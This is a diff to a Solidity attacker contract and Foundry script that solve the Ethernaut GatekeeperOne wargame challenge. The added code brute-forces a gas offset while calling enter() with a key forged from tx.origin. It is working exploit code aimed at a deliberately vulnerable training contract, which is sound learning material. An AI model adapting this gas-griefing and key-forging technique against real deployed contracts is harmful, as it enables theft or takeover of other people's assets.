@@ -15,12 +15,12 @@ contract Attacker {
   }
 
   function attack() public {
-    // gateOne = send the tx from another contract
-    // gateTwo = gasleft() % 8191 == 0
-    // gateThree = uint16(uint160(tx.origin)) as a bytes8 (hex) with the first four bits as a 1 instead of 0 to overflow the unint32 and uint16.
     uint16 addressToInt = uint16(uint160(tx.origin));
     bytes8 key = bytes8(uint64(addressToInt + 2**60));
-    challenge.enter(key); // must brute force this
+    for(uint i;i<120;i++){
+      (bool success, ) = address(challenge).call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
+      if(success) break;
+    }
   }
 
 }
@@ -37,7 +37,7 @@ contract GatekeeperOneAttacker is Script {
     vm.startBroadcast(deployerPrivateKey);
     Attacker attacker = new Attacker(challengeInstanceAddress);
     attacker.attack();
-
+    console.log("Entrant: %s", address(GatekeeperOne(challengeInstanceAddress).entrant()));
     vm.stopBroadcast();
   }
 
